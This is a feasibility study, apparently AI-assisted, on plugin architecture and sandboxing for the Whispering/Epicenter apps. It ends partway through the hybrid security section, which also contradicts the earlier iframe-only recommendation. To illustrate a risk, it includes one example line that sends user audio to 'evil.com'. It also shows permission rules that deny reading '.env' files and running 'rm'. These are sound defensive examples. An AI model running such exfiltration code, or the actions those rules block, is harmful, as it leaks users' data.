# Epicenter Plugin Architecture Feasibility Study

**Date:** 2026-01-22
**Status:** Research Complete
**Authors:** AI-assisted analysis

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Motivation](#motivation)
3. [Current Architecture](#current-architecture)
4. [Plugin Architecture Benefits & Risks](#plugin-architecture-benefits--risks)
5. [Industry Survey: How Others Do It](#industry-survey-how-others-do-it)
6. [Security & Sandboxing](#security--sandboxing)
7. [Runtime Options](#runtime-options)
8. [SvelteKit Integration](#sveltekit-integration)
9. [Epicenter as a Platform](#epicenter-as-a-platform)
10. [Whispering Decomposition](#whispering-decomposition)
11. [Signing & Distribution](#signing--distribution)
12. [OpenCode's Security Model](#opencodes-security-model)
13. [Functional Core / Imperative Shell + Event Sourcing](#functional-core--imperative-shell--event-sourcing)
14. [Actor Model for Multi-Core Parallelism](#actor-model-for-multi-core-parallelism)
15. [Real-Time Transcription Support](#real-time-transcription-support)
16. [Text-Based Media Editing](#text-based-media-editing)
17. [Generative Audio Insertion (AI Voice Synthesis)](#generative-audio-insertion-ai-voice-synthesis)
18. [Epicenter Vault Integration](#epicenter-vault-integration)
19. [Recommendations](#recommendations)
20. [Next Steps](#next-steps)

---

## Executive Summary

This document explores the feasibility of refactoring Whispering (and Epicenter apps generally) into a slim core with plugin/extension architecture. The research concludes that:

1. **Whispering is well-positioned** for plugin extraction due to existing service interfaces and registry patterns
2. **A capability-based security model** is recommended given Whispering handles sensitive data (audio, API keys)
3. **Sandboxed iframes + CSP** as the single runtime for all JS/TS plugins (simpler than Wasm, sufficient security for verified publishers)
4. **Epicenter can become a platform** where Whispering is just one app among many (Notes, Email, Journal)
5. **Shared YJS workspaces** (`@epicenter/hq`) enable cross-app data flow
6. **Partial decomposition** is recommended: keep core recording workflow together, split out management features
7. **jsrepo for distribution** with layered trust (integrity → provenance → verified publisher → curated signing)
8. **Hybrid security model** combining OpenCode's permission UX with iframe sandboxing
9. **Actor Model** for multi-core parallelism and clean message-passing architecture
10. **Real-time transcription** supported with minimal changes to actor architecture (same actors, streaming messages)
11. **Text-based media editing** (Descript-style) is feasible using source-reference document model (informed by Audapolis)
12. **Generative audio insertion** (AI voice synthesis) integrates cleanly as Voice Synth Actor + TTS provider plugins
13. **Epicenter Vault (feat/epicenter-app)** supports text-based editing via `json` field type with TypeBox schemas for word-level segments
14. **Transcription services discard rich metadata** - Word timestamps, confidence, speaker diarization, and language detection are available but not stored; hybrid storage strategy recommended (normalized + optional raw)

---

## Motivation

### Primary Goals

| Goal                           | Description                                            |
| ------------------------------ | ------------------------------------------------------ |
| **One-click modification**     | Allow behavior changes without PR/build step           |
| **Lower contribution barrier** | Smaller, focused codebases are easier to contribute to |
| **Enable vibe-coding**         | Rapid prototyping without touching core                |
| **Keep core clean**            | Users customize without polluting main repo            |

### Additional Benefits Identified

| Benefit                  | Description                                               |
| ------------------------ | --------------------------------------------------------- |
| **A/B Testing**          | Users try alternative implementations safely              |
| **Community Innovation** | Power users prototype features that may graduate to core  |
| **Reduced Maintenance**  | Edge-case features maintained by interested parties       |
| **Faster Iteration**     | Plugin authors ship independently of core releases        |
| **Monetization**         | Premium plugins (enterprise integrations, specialized AI) |
| **Testing Isolation**    | Plugins tested independently; bugs isolated               |
| **Graceful Degradation** | Faulty plugins disabled without affecting core            |
| **Domain Customization** | Medical, legal, coding - specialized vocabularies         |
| **Offline Options**      | Restricted environments use only local plugins            |

---

## Current Architecture

### Whispering's Three-Layer Architecture

```
┌─────────────────────────────────────────────────────────┐
│  UI Layer (Svelte Components, Routes)                   │
│  - Consumes queries/mutations from query layer          │
│  - Displays WhisperingError in toasts                   │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  Query Layer ($lib/query/)                              │
│  - TanStack Query for caching & reactivity              │
│  - Wraps service errors → WhisperingError               │
│  - Injects settings/configuration                       │
└───────────────────────┬─────────────────────────────────┘
                        │
┌───────────────────────▼─────────────────────────────────┐
│  Services Layer ($lib/services/)                        │
│  - Pure business logic, no UI dependencies              │
│  - Returns Result<T, ServiceError>                      │
│  - Platform-specific implementations via DI             │
└─────────────────────────────────────────────────────────┘
```

### Existing Plugin-Friendly Patterns

| Pattern                | Location                    | Description                           |
| ---------------------- | --------------------------- | ------------------------------------- |
| Service Factory        | `services/*/`               | `createMyService()` → `MyServiceLive` |
| Platform Detection     | `services/*/index.ts`       | `window.__TAURI_INTERNALS__` check    |
| Transcription Registry | `transcription/registry.ts` | Declarative service registration      |
| Command Registry       | `commands.ts`               | Array of command definitions          |
| Settings Schema        | `settings/settings.ts`      | ArkType validation with defaults      |

### Current Module Sizes

| Module                     | Lines  | Plugin Candidate? |
| -------------------------- | ------ | ----------------- |
| Transcription Services (9) | ~1,841 | Yes - Easy        |
| Completion Providers (6)   | ~615   | Yes - Easy        |
| Recordings Page            | ~1,364 | Yes - Medium      |
| Transformations Page       | ~2,000 | Yes - Medium      |
| Settings Pages             | ~3,941 | Partial           |
| CPAL Recorder              | ~334   | Yes - Easy        |
| FFmpeg Recorder            | ~716   | Yes - Medium      |

---

## Plugin Architecture Benefits & Risks

### Technical Risks

| Risk                     | Severity | Mitigation                                                 |
| ------------------------ | -------- | ---------------------------------------------------------- |
| **API Stability**        | High     | Semantic versioning, deprecation periods, adapter layers   |
| **Security**             | Critical | Sandboxing, permissions, code signing, curated marketplace |
| **Performance**          | Medium   | Resource limits, async boundaries, profiling               |
| **State Corruption**     | High     | Immutable state, event-driven, validation layers           |
| **Dependency Conflicts** | Medium   | Isolated plugin contexts, bundled independently            |
| **Tauri/Native Access**  | High     | Capability-based permissions, blessed APIs only            |

### Organizational Risks

| Risk                   | Severity | Mitigation                                             |
| ---------------------- | -------- | ------------------------------------------------------ |
| **Support Burden**     | High     | Clear plugin attribution, crash reporting with context |
| **Quality Variance**   | Medium   | Review process, ratings, verified publishers           |
| **Documentation Debt** | Medium   | Auto-generated API docs, example plugins               |
| **Fragmentation**      | Low      | Featured plugins, consolidation incentives             |

### Architectural Risks

| Risk                   | Severity | Mitigation                                        |
| ---------------------- | -------- | ------------------------------------------------- |
| **Over-Engineering**   | High     | Start with 2-3 extension points, expand on demand |
| **Leaky Abstractions** | Medium   | Comprehensive hooks, escape hatches with warnings |
| **Version Matrix**     | High     | Automated compatibility testing, SDK pinning      |

---

## Industry Survey: How Others Do It

### Comparison Matrix

| Platform              | Sandboxing                | Permissions           | Security | DX        |
| --------------------- | ------------------------- | --------------------- | -------- | --------- |
| **VS Code**           | Process isolation         | None (trust-based)    | Medium   | High      |
| **Chrome Extensions** | Process + isolated worlds | Declarative + runtime | High     | Medium    |
| **Obsidian**          | None                      | None                  | Low      | Very High |
| **Figma**             | iframe + minimal JS       | Network allowlist     | High     | Lower     |
| **Raycast**           | V8 isolate                | OS-level              | Medium   | High      |

### Key Lessons

**VS Code:**

- Contribution points pattern works well
- Activation events reduce startup cost
- Language Server Protocol enables reusable tooling

**Chrome Extensions (MV3):**

- Declarative permissions build user trust
- Manifest versioning is painful but necessary
- No remote code = auditable

**Obsidian:**

- Zero isolation is dangerous for sensitive data
- Relies entirely on code review + trust
- Maximum DX, minimum security

**Figma:**

- Split architecture (sandbox + iframe) is complex but secure
- Network allowlist is effective

**Raycast:**

- V8 isolates provide good isolation
- Open source requirement enables auditing
- Managed Node runtime reduces attack surface

---

## Security & Sandboxing

### Whispering's Unique Security Considerations

| Factor                   | Implication                                     |
| ------------------------ | ----------------------------------------------- |
| Handles audio recordings | Voice biometrics, conversations, meetings       |
| Stores API keys          | OpenAI, Anthropic, Groq = financial/access risk |
| Desktop app (Tauri)      | Filesystem, clipboard, global shortcuts         |
| Transcription = text     | PII, confidential information                   |

**Conclusion:** Whispering plugins are higher-risk than typical productivity apps.

### Recommended Security Model: Capability-Based

```typescript
// Plugin manifest
{
  "id": "transcription-groq",
  "capabilities": {
    "network": ["api.groq.com"],
    "settings:read": ["apiKeys.groq"],
    "audio:read": true,
    "transcription:provide": true
  }
}
```

### Security Tiers

```
┌─────────────────────────────────────────────────────┐
│  Tier 3: System Plugins     ⚠️  HIGH PRIVILEGE       │
│  • CPAL recorder, FFmpeg                            │
│  • Require explicit approval + signing              │
├─────────────────────────────────────────────────────┤
│  Tier 2: UI Plugins         📦 SANDBOXED             │
│  • Alternative pages, themes                        │
│  • Run in iframe, postMessage only                  │
├─────────────────────────────────────────────────────┤
│  Tier 1: Service Plugins    🔒 CAPABILITY-GATED     │
│  • Transcription, completion providers              │
│  • Run in Web Worker, scoped API access             │
└─────────────────────────────────────────────────────┘
```

### API Key Protection

API keys should NEVER be exposed directly to plugins. Options:

1. **Core injects keys** - Plugin provides request builder, core adds auth
2. **Capability tokens** - Plugin receives scoped token, not raw key
3. **Proxy pattern** - Core makes HTTP requests on behalf of plugins

---

## Runtime Options

### Comparison Matrix

| Runtime             | Security  | Startup | Speed       | Memory   | Tauri Fit | DX        |
| ------------------- | --------- | ------- | ----------- | -------- | --------- | --------- |
| **Wasm (Extism)**   | Very High | <1ms    | Near-native | Low      | Easy      | Moderate  |
| **Deno (embedded)** | High      | ~50ms   | Fast        | +50MB    | Good      | Excellent |
| **QuickJS**         | High      | <1ms    | Slow        | Very Low | Easy      | Basic     |
| **Web Workers**     | Low\*     | ~1ms    | Fast        | Low      | Native    | Good      |
| **iframes + CSP**   | High      | ~100ms  | Fast        | Medium   | Native    | Good      |
| **Bun**             | None      | ~10ms   | Fast        | Medium   | Difficult | Excellent |
| **Node vm**         | None      | ~1ms    | Fast        | Low      | Native    | Good      |

\*Web Workers have unrestricted `fetch` - cannot be sandboxed for network access.

### Recommendation: Sandboxed iframes + CSP for All Plugins

After analysis, **sandboxed iframes with CSP** are recommended as the **single runtime** for all JavaScript/TypeScript plugins. This simplifies the architecture while providing sufficient security for Whispering's use case.

```
┌──────────────────────────────────────────────────────────────┐
│                     PLUGIN RUNTIME STRATEGY                   │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  ALL JS/TS PLUGINS (Service + UI)                            │
│  Runtime: Sandboxed iframe + CSP                             │
│  Security: Browser-enforced network restrictions              │
│  DX: Just write JavaScript/TypeScript                        │
│                                                               │
│  SYSTEM PLUGINS (CPAL, FFmpeg)                               │
│  Runtime: Native Rust (verified/signed only)                 │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

### Why iframe-Only (Not Wasm)?

| Factor                 | Wasm (Extism)               | Sandboxed iframe + CSP           |
| ---------------------- | --------------------------- | -------------------------------- |
| **Network security**   | No `fetch` (secure)         | CSP blocks unauthorized (secure) |
| **Memory isolation**   | Linear memory only          | Separate process                 |
| **CPU/DoS protection** | Fuel metering               | Timeout wrapper needed           |
| **Memory limits**      | Configurable                | Browser OOM handling             |
| **Plugin author DX**   | Need Rust/Go/AssemblyScript | Just JavaScript/TypeScript       |
| **Toolchain**          | Wasm compilation required   | Standard web tooling             |
| **Debugging**          | Wasm debugging tools        | Browser DevTools                 |
| **Startup time**       | <1ms                        | ~100ms                           |

**Key insight:** For Whispering's threat model (verified publishers, not anonymous marketplace), iframe security is sufficient and dramatically improves developer experience.

### Wasm vs iframe: Security Tradeoffs

| Attack Vector            | Wasm                   | iframe + CSP            | Risk Level |
| ------------------------ | ---------------------- | ----------------------- | ---------- |
| **Unauthorized network** | Blocked                | Blocked (CSP)           | None       |
| **Host memory access**   | Impossible             | Impossible              | None       |
| **DOM manipulation**     | Impossible             | Blocked (sandbox)       | None       |
| **Cookie/storage theft** | Impossible             | Blocked (sandbox)       | None       |
| **CPU exhaustion**       | Fuel metering          | **Timeout wrapper**     | Low        |
| **Memory exhaustion**    | Configurable limits    | **Browser OOM**         | Low        |
| **JS engine exploits**   | Smaller attack surface | **Larger surface**      | Very Low   |
| **Prototype pollution**  | Impossible             | **Contained to iframe** | Low        |

**Verdict:** iframe-only is acceptable when:

- Plugins come from verified publishers (not anonymous)
- Timeout protection is implemented
- You're not running a public marketplace with untrusted code

### Why NOT Web Workers?

Web Workers **cannot be sandboxed** for network access:

```typescript
// Web Worker can ALWAYS do this, regardless of any "bridge":
await fetch('https://evil.com/steal', { body: userAudioData });
```

- Deleting `fetch` is bypassable via `import()` or `eval()`
- CSP for Workers doesn't restrict `fetch` destinations
- Workers have unrestricted network access by design

**Sandboxed iframes ARE secure:**

```html
<iframe
	sandbox="allow-scripts"
	csp="connect-src api.groq.com; default-src 'none';"
></iframe>
```

Browser enforces CSP at the network layer - cannot be bypassed by JavaScript.

### Unified Plugin Loader

One loader for all plugins (service and UI):

```typescript
function loadPlugin(manifest: PluginManifest): PluginHandle {
	const iframe = document.createElement('iframe');

	// Security: sandbox + CSP
	iframe.sandbox = 'allow-scripts';

	const connectSrc = manifest.capabilities.network?.length
		? manifest.capabilities.network.join(' ')
		: "'none'";

	iframe.csp = `
    default-src 'none';
    script-src 'unsafe-inline' 'unsafe-eval';
    connect-src ${connectSrc};
    style-src 'unsafe-inline';
  `;

	// UI plugins: visible; Service plugins: hidden
	if (manifest.type === 'ui') {
		iframe.style.cssText = 'width:100%;height:100%;border:none;';
		container.appendChild(iframe);
	} else {
		iframe.style.display = 'none';
		document.body.appendChild(iframe);
	}

	iframe.srcdoc = buildPluginHTML(manifest, pluginCode);

	// Timeout protection for service plugins
	let timeoutId: number | null = null;

	return {
		call: (method: string, args: unknown) => {
			return new Promise((resolve, reject) => {
				const id = nanoid();

				// CPU protection: timeout
				timeoutId = window.setTimeout(() => {
					reject(new Error('Plugin timeout'));
					iframe.remove();
				}, manifest.timeout ?? 30_000);

				const handler = (e: MessageEvent) => {
					if (e.source === iframe.contentWindow && e.data.id === id) {
						clearTimeout(timeoutId!);
						window.removeEventListener('message', handler);
						if (e.data.error) reject(new Error(e.data.error));
						else resolve(e.data.result);
					}
				};
				window.addEventListener('message', handler);

				iframe.contentWindow?.postMessage({ id, method, args }, '*');
			});
		},

		terminate: () => {
			if (timeoutId) clearTimeout(timeoutId);
			iframe.remove();
		},
	};
}
```

### Plugin SDK

Simple SDK for plugin authors:

```typescript
// @whispering/plugin-sdk
type PluginMethods = Record<string, (...args: any[]) => Promise<unknown>>;

export function definePlugin(methods: PluginMethods) {
	window.addEventListener('message', async (e) => {
		const { id, method, args } = e.data;

		if (methods[method]) {
			try {
				const result = await methods[method](...args);
				parent.postMessage({ id, result }, '*');
			} catch (error) {
				parent.postMessage({ id, error: (error as Error).message }, '*');
			}
		} else {
			parent.postMessage({ id, error: `Unknown method: ${method}` }, '*');
		}
	});

	parent.postMessage({ type: 'PLUGIN_READY' }, '*');
}
```

### Example Plugin (Groq Transcription)

```typescript
// plugins/transcription-groq/index.ts
import { definePlugin } from '@whispering/plugin-sdk';

definePlugin({
	async transcribe(blob: Blob, options: { apiKey: string; model?: string }) {
		const formData = new FormData();
		formData.append('file', blob, 'audio.webm');
		formData.append('model', options.model ?? 'whisper-large-v3');

		// fetch() works because manifest declares: network: ['api.groq.com']
		// CSP blocks any other domain - no bridge needed!
		const response = await fetch(
			'https://api.groq.com/openai/v1/audio/transcriptions',
			{
				method: 'POST',
				headers: { Authorization: `Bearer ${options.apiKey}` },
				body: formData,
			},
		);

		const data = await response.json();
		return data.text;
	},
});
```

### When to Consider Wasm Instead

Upgrade to Wasm (Extism) if:

| Scenario                                         | Why Wasm                          |
| ------------------------------------------------ | --------------------------------- |
| **Public marketplace with anonymous publishers** | Stronger isolation, fuel metering |
| **Need hard CPU limits**                         | Wasm fuel metering                |
| **Need hard memory limits**                      | Wasm memory configuration         |
| **Paranoid about browser zero-days**             | Smaller attack surface            |
| **Plugin processes very sensitive data**         | Defense in depth                  |

For Whispering's current needs (verified publishers, community plugins), iframe-only is sufficient.

### iframe Startup Performance

iframe startup takes ~50-120ms due to:

```
1. DOM insertion          ~1-5ms    Create element, add to document
2. Process creation       ~20-50ms  Browser spawns isolated process
3. Document parsing       ~5-10ms   Parse srcdoc HTML
4. Script compilation     ~10-30ms  Parse and compile plugin JS
5. Script execution       ~5-20ms   Run plugin initialization
6. postMessage ready      ~1-5ms    Event listener registered
```

**Key insight:** This cost is paid **once per plugin** if plugins stay loaded.

### Mitigation Strategies

#### 1. Keep Plugins Loaded (Recommended)

```typescript
class PluginManager {
	private loadedPlugins = new Map<string, PluginHandle>();

	async getPlugin(id: string): Promise<PluginHandle> {
		// Reuse existing instance - instant
		if (this.loadedPlugins.has(id)) {
			return this.loadedPlugins.get(id)!;
		}

		// First load - pay 100ms once
		const handle = await this.loadPlugin(id);
		this.loadedPlugins.set(id, handle);
		return handle;
	}
}
```

#### 2. Preload Active Plugin at App Startup

```typescript
// During splash screen
async function initializePlugins() {
	const activeTranscriptionId = settings.value['transcription.selectedPlugin'];
	if (activeTranscriptionId) {
		await pluginManager.getPlugin(activeTranscriptionId);
	}
}
```

#### 3. Preload During Idle Time

```typescript
// Load other plugins when browser is idle
window.addEventListener('load', () => {
	setTimeout(() => {
		installedPlugins.forEach((manifest, i) => {
			requestIdleCallback(
				() => {
					pluginManager.getPlugin(manifest.id);
				},
				{ timeout: 5000 + i * 1000 },
			);
		});
	}, 2000);
});
```

### CSP Limitation with Warm Pools

Pre-warming iframe pools has a limitation: **CSP is fixed at iframe creation time**.

```typescript
// Can't change CSP after creation
const warmIframe = createIframe({ connectSrc: "'none'" });
// Later: Can't add api.groq.com - iframe already has restrictive CSP
```

**Solution:** Accept first-load cost per plugin, then keep loaded. For Whispering, users typically use one transcription provider consistently, so 100ms once is acceptable.

### Performance Summary

| Scenario                      | Latency | Strategy                         |
| ----------------------------- | ------- | -------------------------------- |
| **App startup**               | Hidden  | Load during splash screen        |
| **First transcription**       | ~100ms  | Preload active plugin at startup |
| **Subsequent transcriptions** | ~1ms    | Plugin stays loaded              |
| **Switching providers**       | ~100ms  | Acceptable (rare operation)      |

---

## SvelteKit Integration

### The Core Challenge

Svelte components must be **compiled before execution**. This creates tension with "one-click install."

### Solutions

| Approach                 | Security    | Performance | Integration | Recommendation       |
| ------------------------ | ----------- | ----------- | ----------- | -------------------- |
| **Pre-compiled bundles** | Trust-based | Excellent   | Full        | First-party plugins  |
| **Web Components**       | Good        | Good        | Medium      | Semi-trusted plugins |
| **iframe sandbox**       | Excellent   | Poor        | Limited     | Untrusted plugins    |
| **Runtime compilation**  | Poor        | Poor        | Full        | Not recommended      |

### Plugin Distribution Model

```
Plugin Author                    Plugin Registry               User
─────────────                    ───────────────               ────
1. Write Svelte + TS             Hosts pre-compiled            1. Browse plugins
2. Run `npm run build`           bundles + manifests           2. Click "Install"
3. Push to GitHub/npm            GitHub Actions builds         3. Downloads bundle
                                 automatically                 4. Plugin loads
```

**Key insight:** "One-click install" doesn't require runtime compilation - it requires good distribution (GitHub releases + automated builds).

### Dynamic Route Registration

```svelte
<!-- src/routes/plugins/[...path]/+page.svelte -->
<script>
	import { page } from '$app/stores';
	import { pluginRegistry } from '$lib/plugins';

	let PluginComponent = $derived(
		pluginRegistry.getRouteComponent($page.params.path),
	);
</script>

{#if PluginComponent}
	<PluginComponent />
{:else}
	<p>Plugin not found</p>
{/if}
```

---

## Epicenter as a Platform

### Vision

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         EPICENTER PLATFORM                               │
│                                                                          │
│  "A personal data operating system where apps are just views            │
│   into your unified data vault"                                         │
│                                                                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │
│   │ Whispering  │  │   Notes     │  │    Email    │  │   Journal   │   │
│   │   (App)     │  │   (App)     │  │   (App)     │  │   (App)     │   │
│   └──────┬──────┘  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘   │
│          │                │                │                │          │
│          └────────────────┴────────────────┴────────────────┘          │
│                                    │                                    │
│                           ┌───────▼────────┐                           │
│                           │  EPICENTER CORE │                           │
│                           │ • Vault (YJS)   │                           │
│                           │ • Services      │                           │
│                           │ • Settings      │                           │
│                           │ • UI Components │                           │
│                           │ • Plugin System │                           │
│                           └─────────────────┘                           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### What Already Exists

| Package                   | Purpose                                    | Status        |
| ------------------------- | ------------------------------------------ | ------------- |
| `@epicenter/hq`           | YJS workspace system (tables, KV, actions) | Ready         |
| `@epicenter/vault-core`   | Data import adapters                       | Ready (alpha) |
| `@epicenter/ui`           | 50+ components                             | Ready         |
| `@epicenter/svelte-utils` | `createPersistedState`                     | Ready         |
| Whispering patterns       | Services, queries, settings                | Extractable   |

### Cross-App Data Flow

The killer feature: **Apps can reference each other's data**

```
Whispering Recording ──linkedTo──▶ Notes App Note
        │
        └──transform──▶ Email App Draft
                │
                └──aggregate──▶ Journal App Entry
```

### Minimal Core API

```typescript
// @epicenter/core

// 1. App Registration
export function defineApp(config: AppConfig): EpicenterApp;

// 2. Workspace (re-export from @epicenter/hq)
export { defineWorkspace, createTables, createKv } from '@epicenter/hq';

// 3. Core Services
export const services = {
	notifications,
	toast,
	clipboard,
	sound,
	download,
	analytics,
};

// 4. Settings
export function defineSettings<T>(schema: T): Settings<T>;

// 5. Plugin System
export function registerApp(app: EpicenterApp): void;
export function queryAcrossApps(query: CrossAppQuery): Result[];
```

---

## Whispering Decomposition

### Feature Coupling Analysis

```
Recording Flow (TIGHT coupling - keep together)
═══════════════════════════════════════════════
[Record] → [Transcribe] → [Transform] → [Deliver]
         All happen in ONE user action

Management Features (LOOSE coupling - can split)
════════════════════════════════════════════════
[Browse Recordings]  [Edit Transformations]  [Settings]
         Separate user sessions
```

### Recommended Split

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        WHISPERING ECOSYSTEM                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  CORE (always installed) - @whispering/core                             │
│  • Recording + transcription + transformation + delivery                │
│  • Recent recordings widget                                             │
│  • ~2,000 lines                                                         │
│                                                                          │
│  SHARED (dependency) - @whispering/workspace                            │
│  • YJS workspace schema                                                 │
│  • Type definitions                                                     │
│  • ~200 lines                                                           │
│                                                                          │
│  OPTIONAL APPS (installable)                                            │
│  ─────────────────────────────                                          │
│  @whispering/recordings-manager    @whispering/recordings-mobile        │
│  • TanStack Table view             • Simple list view                   │
│  • Bulk operations, export         • Touch-friendly                     │
│                                                                          │
│  @whispering/transformations-editor                                     │
│  • Visual pipeline builder                                              │
│  • Test runner                                                          │
│                                                                          │
│  @whispering/transcription-*       @whispering/completion-*             │
│  • transcription-openai            • completion-anthropic               │
│  • transcription-groq              • completion-groq                    │
│  • transcription-local             • completion-local                   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Development Experience Impact

| Aspect                         | Monolith               | Decomposed                 |
| ------------------------------ | ---------------------- | -------------------------- |
| **Working on Recordings**      | Navigate 15,000+ lines | Open ~1,500 line package   |
| **Risk of breaking unrelated** | High                   | Low                        |
| **Testing**                    | Run full app           | Run isolated app           |
| **Parallel development**       | Conflicts likely       | Independent work           |
| **Cross-cutting changes**      | Easier                 | Harder (multiple packages) |

### Verdict

| Question                    | Answer                                                                  |
| --------------------------- | ----------------------------------------------------------------------- |
| Should Whispering be split? | Partially - core workflow together, management split                    |
| Easier or harder?           | **Easier** for isolated features, **slightly harder** for cross-cutting |
| What enables the split?     | Shared workspace (`@whispering/workspace`) via YJS                      |
| What's the win?             | Optional installs, alternative UIs, community contributions             |
| What's the risk?            | Version drift, UX inconsistency, debugging complexity                   |

---

## Signing & Distribution

### Industry Signing Approaches

| Platform     | What's Signed       | Who Signs                  | Trust Model               | Transparency         |
| ------------ | ------------------- | -------------------------- | ------------------------- | -------------------- |
| **npm**      | Tarball             | Registry + CI (provenance) | Registry keys + OIDC      | Rekor log (optional) |
| **VS Code**  | Nothing             | N/A                        | Domain verification badge | None                 |
| **Chrome**   | CRX package         | Google only                | Centralized               | None                 |
| **Homebrew** | Nothing (checksums) | N/A                        | Maintainer review         | Git history          |
| **Apple**    | Binary + resources  | Developers ($99/yr)        | Certificate chain         | None                 |
| **Sigstore** | Any artifact        | Anyone with OIDC           | Identity-based            | Rekor log            |
| **GitHub**   | Artifacts           | GitHub Actions             | Repository identity       | Rekor log            |

### Recommended: jsrepo + Layered Trust

[jsrepo](https://jsrepo.dev) is a modern registry toolchain that solves distribution without npm:

- **Host anywhere**: GitHub, GitLab, self-hosted, jsrepo.com
- **Shadcn-style**: Users own the code (copy, not dependency)
- **Auto dependency resolution**: Plugins declare deps, jsrepo handles install
- **Interactive updates**: `jsrepo update` shows diffs
- **Svelte-native**: Supports folder-based components

### Distribution Flow

```
Plugin Author                    Registry                    User
─────────────                    ────────                    ────
1. Write plugin (Svelte + TS)    GitHub repo or              1. Browse plugins
2. Configure jsrepo.config.ts    jsrepo.com hosts            2. Click "Install"
3. Run `jsrepo build`            pre-compiled bundles        3. jsrepo downloads
4. Push to GitHub                                            4. Plugin loads
```

### Layered Trust Model

#### Layer 1: Integrity (Automatic)

```json
{
	"name": "transcription-groq",
	"files": [{ "path": "src/index.ts", "integrity": "sha256-abc123..." }]
}
```

- SHA-256 hash of every file
- Generated automatically by `jsrepo build`
- Verified on install

#### Layer 2: Provenance (Recommended)

Using GitHub Artifact Attestations (Sigstore-based):

```yaml
# .github/workflows/publish-registry.yml
- uses: actions/attest-build-provenance@v2
  with:
    subject-path: registry.json
```

Provides:

- Proof built from specific commit
- Proof built by GitHub Actions (not local)
- Transparency log entry in Rekor

#### Layer 3: Verified Publisher (Badge)

Like VS Code's verified publisher:

- DNS TXT record verification
- GitHub account linking
- 90+ day account age
- Results in ✓ Verified badge

#### Layer 4: Curated Signing (Tier 3 Only)

For system plugins needing native access:

- Epicenter team signs after review
- Required for CPAL, FFmpeg, etc.

### Plugin Manifest for jsrepo

```typescript
// jsrepo.config.ts
export default defineConfig({
	registry: {
		name: '@whispering/transcription-groq',

		meta: {
			tier: 1,
			capabilities: ['network:api.groq.com', 'audio:read'],
			whisperingVersion: '>=2.0.0',
			author: { name: 'Epicenter Team', verified: true },
		},

		excludeDeps: ['svelte', '@epicenter/core'],

		items: [
			{
				name: 'transcription-groq',
				type: 'service',
				files: [{ path: 'src/index.ts' }],
				envVars: { GROQ_API_KEY: '' },
			},
		],

		outputs: [repository()],
	},
});
```

### Distribution Channels

| Channel                | Use Case               | Cost |
| ---------------------- | ---------------------- | ---- |
| `github/org/repo`      | Primary, open source   | Free |
| `jsrepo:@org/name`     | Managed hosting        | Paid |
| `https://custom.com/r` | Enterprise self-hosted | Self |
| `fs://./local`         | Development            | Free |

---

## OpenCode's Security Model

### Overview

OpenCode takes a fundamentally different approach: **trust-based with permission controls**, not sandboxed.

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    OPENCODE SECURITY MODEL                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Plugins run with FULL ACCESS to:                                       │
│  • Node.js APIs (via Bun)                                               │
│  • File system                                                          │
│  • Network                                                              │
│  • Shell execution                                                      │
│                                                                          │
│  BUT... the LLM's USE of tools is gated by permissions                  │
│                                                                          │
│  Key insight: OpenCode doesn't sandbox plugin CODE                      │
│               It controls what the LLM can ASK the plugin to do         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Permission System

```json
{
	"permission": {
		"*": "ask",

		"read": {
			"*": "allow",
			"*.env": "deny"
		},

		"bash": {
			"*": "ask",
			"git *": "allow",
			"rm *": "deny"
		},

		"edit": {
			"*": "ask",
			"*.md": "allow"
		}
	}
}
```

### Permission Actions

| Action    | Behavior                     |
| --------- | ---------------------------- |
| `"allow"` | Run without approval         |
| `"ask"`   | Prompt user, remember choice |
| `"deny"`  | Block entirely               |

### Why It Works for OpenCode

| Factor               | Rationale                         |
| -------------------- | --------------------------------- |
| User is a developer  | Can audit code, understands risks |
| Local-first          | Plugins from own machine/repo     |
| Permission prompts   | User approves dangerous actions   |
| Not handling secrets | API keys in env, not in data      |
| Code is auditable    | Plain JS/TS files                 |

### OpenCode vs. Whispering

| Aspect         | OpenCode            | Whispering                |
| -------------- | ------------------- | ------------------------- |
| **User**       | Developer           | End user (less technical) |
| **Data**       | Code (on disk)      | Audio, API keys           |
| **Source**     | npm, local          | Marketplace, community    |
| **Trust**      | User responsibility | App must protect user     |
| **Sandboxing** | None                | Required                  |

### What to Adopt from OpenCode

1. **Glob-based permission patterns**

   ```json
   { "network": { "*": "deny", "api.groq.com": "allow" } }
   ```

2. **Allow/Ask/Deny model** for user control

3. **Per-plugin permission overrides**

4. **Tool hooks for auditing**
   ```typescript
   "tool.execute.before": async (input, output) => {
     log(`Plugin ${input.tool} accessing: ${output.args}`)
   }
   ```

### What Whispering Needs Beyond OpenCode

| Need                 | OpenCode | Whispering        |
| -------------------- | -------- | ----------------- |
| Code sandboxing      | No       | Yes (Wasm/iframe) |
| API key isolation    | No       | Yes               |
| Audio access control | N/A      | Yes               |
| Marketplace trust    | No       | Yes               |
| Provenance           | No       | Yes               |

### Hybrid Model for Whispering

```
┌─────────────────────────────────────────────────────────────────────────┐
│               WHISPERING HYBRID SECURITY MODEL                           │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  LAYER 1: Sandboxing (What plugin CAN do)                               │
│  • Tier 1: Wasm sandbox - no raw API access                             │
│  • Tier 2: iframe sandbox - no direct state access                      │
│  • Tier 3: Native - verified/signed only                                │
│                                                                          │
│  LAYER 2: Capabilities (What plugin DECLARES)                           │
│  • Manifest declares required capabilities                              │
│  • Runtime validates all API calls                                      │
│                                                                          │
│  LAYER 3: Permissions (What user ALLOWS) ← OpenCode-style               │
│  • User overrides with allow/ask/deny                                   │
│  • Glob patterns for fine-grained control                               │
│                                                                          │
│  LAYER 4: Trust (What ecosystem VERIFIES)                               │
│  • Integrity hashes, provenance, verified publishers                    │
│                                                                          │
